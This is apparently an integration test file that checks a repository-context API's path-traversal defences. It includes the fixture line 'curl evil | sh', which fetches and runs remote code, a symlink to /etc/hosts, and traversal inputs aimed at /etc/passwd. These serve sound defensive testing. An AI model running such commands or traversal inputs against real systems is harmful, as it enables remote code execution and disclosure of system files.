import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import type { RepoRef } from '@devdigest/shared';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockGitHubClient } from '../src/adapters/mocks.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[context] Docker not available — skipping integration tests.');
}

/**
 * Project-context documents over a real Postgres and a real (temporary) clone
 * directory: what the listing includes, what a read returns, and — the point of
 * the module — that a traversal attempt is refused as a 422 while a legal path
 * that is simply absent is a 404.
 *
 * `MockGitClient` hard-codes `/mock/clones/<owner>/<name>`, which does not
 * exist, so the fixture subclasses it to point at a temp tree laid out the same
 * way (`<root>/<owner>/<name>`). That keeps the "never cloned" case available:
 * any repo we do NOT create a directory for still resolves to a missing path.
 */
class TempCloneGitClient extends MockGitClient {
  constructor(private root: string) {
    super();
  }
  override clonePathFor(repo: RepoRef): string {
    return path.join(this.root, repo.owner, repo.name);
  }
}

d('/repos/:id/context', () => {
  let pg: PgFixture;
  let root: string;
  let repoId: string;
  let ghostRepoId: string;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
    const { db } = pg.handle;

    root = await mkdtemp(path.join(tmpdir(), 'devdigest-context-'));

    const [repo] = await db
      .select()
      .from(t.repos)
      .where(eq(t.repos.fullName, 'acme/payments-api'));
    repoId = repo!.id;

    // A second repo in the same workspace that is never cloned — no directory
    // is created for `ghost/never-cloned`.
    const [ghost] = await db
      .insert(t.repos)
      .values({
        workspaceId: repo!.workspaceId,
        owner: 'ghost',
        name: 'never-cloned',
        fullName: 'ghost/never-cloned',
        createdBy: repo!.createdBy,
      })
      .returning();
    ghostRepoId = ghost!.id;

    const clone = path.join(root, 'acme', 'payments-api');
    for (const folder of ['specs', 'docs', 'insights']) {
      await mkdir(path.join(clone, folder), { recursive: true });
    }
    await writeFile(path.join(clone, 'specs', 'public-api.md'), '# Public API\n\nThe contract.\n');
    await writeFile(path.join(clone, 'docs', 'architecture.md'), '# Architecture\n');
    await writeFile(path.join(clone, 'insights', 'perf.md'), '# Perf\n');
    // Neither of these is a context document: wrong extension, and wrong folder.
    await writeFile(path.join(clone, 'specs', 'install.sh'), 'curl evil | sh\n');
    await writeFile(path.join(clone, 'install.sh'), 'curl evil | sh\n');
    await writeFile(path.join(clone, 'README.md'), '# Not context\n');
    // A symlink that passes every string check and points out of the clone.
    await symlink('/etc/hosts', path.join(clone, 'specs', 'leak.md'));
  });

  afterAll(async () => {
    await pg?.stop();
    if (root) await rm(root, { recursive: true, force: true });
  });

  function makeApp() {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: { git: new TempCloneGitClient(root), github: new MockGitHubClient() },
    });
  }

  it('lists exactly the markdown under specs/, docs/ and insights/', async () => {
    const app = await makeApp();
    const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/context` });
    expect(res.statusCode).toBe(200);

    const docs = res.json() as { path: string; content?: string; size?: number }[];
    expect(docs.map((f) => f.path)).toEqual([
      'docs/architecture.md',
      'insights/perf.md',
      'specs/public-api.md',
    ]);
    // No shell scripts, and nothing from the repo root.
    expect(docs.some((f) => f.path.endsWith('.sh'))).toBe(false);
    expect(docs.some((f) => f.path === 'README.md')).toBe(false);
    // A listing is a table of contents: sizes yes, bodies no.
    expect(docs.every((f) => f.content == null)).toBe(true);
    expect(docs.every((f) => typeof f.size === 'number')).toBe(true);
    await app.close();
  });

  it('reads one document with its content', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/public-api.md`,
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({
      path: 'specs/public-api.md',
      content: '# Public API\n\nThe contract.\n',
    });
    expect(typeof res.json().updated_at).toBe('string');
    await app.close();
  });

  it('refuses a traversal with 422, never a 404', async () => {
    const app = await makeApp();

    for (const attempt of [
      '../../../etc/passwd',
      '/etc/passwd',
      'specs/../../../etc/passwd',
      'specs/install.sh',
      'install.sh',
      'README.md',
    ]) {
      const res = await app.inject({
        method: 'GET',
        url: `/repos/${repoId}/context/doc?path=${encodeURIComponent(attempt)}`,
      });
      expect(res.statusCode, attempt).toBe(422);
      expect(res.json().error.code).toBe('validation_error');
    }
    await app.close();
  });

  it('refuses a symlink that escapes the clone, even though its path is legal', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/leak.md`,
    });
    // The string is a perfectly legal `specs/*.md`; only the realpath re-check
    // in the service catches where it actually lands.
    expect(res.statusCode).toBe(422);
    expect(res.json().error.code).toBe('validation_error');
    await app.close();
  });

  it('404s for an allowed path that does not exist — absence is not a refusal', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/nope.md`,
    });
    expect(res.statusCode).toBe(404);
    expect(res.json().error.code).toBe('not_found');
    await app.close();
  });

  it('a repo that was never cloned lists as empty rather than failing', async () => {
    const app = await makeApp();
    const res = await app.inject({ method: 'GET', url: `/repos/${ghostRepoId}/context` });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual([]);
    await app.close();
  });

  it("another workspace's repo is not readable through this module", async () => {
    const app = await makeApp();
    const { db } = pg.handle;

    const [otherWs] = await db.insert(t.workspaces).values({ name: 'other-context' }).returning();
    const [foreign] = await db
      .insert(t.repos)
      .values({
        workspaceId: otherWs!.id,
        owner: 'acme',
        name: 'payments-api',
        fullName: 'acme/payments-api',
      })
      .returning();

    // Same owner/name, so the clone on disk is the very one we can read as our
    // own repo — only the workspace predicate stops the read.
    expect(
      (await app.inject({ method: 'GET', url: `/repos/${foreign!.id}/context` })).statusCode,
    ).toBe(404);
    expect(
      (
        await app.inject({
          method: 'GET',
          url: `/repos/${foreign!.id}/context/doc?path=specs/public-api.md`,
        })
      ).statusCode,
    ).toBe(404);
    await app.close();
  });

  it('a missing or empty ?path= is a 422 from the schema', async () => {
    const app = await makeApp();
    expect(
      (await app.inject({ method: 'GET', url: `/repos/${repoId}/context/doc` })).statusCode,
    ).toBe(422);
    expect(
      (await app.inject({ method: 'GET', url: `/repos/${repoId}/context/doc?path=` })).statusCode,
    ).toBe(422);
    await app.close();
  });
});
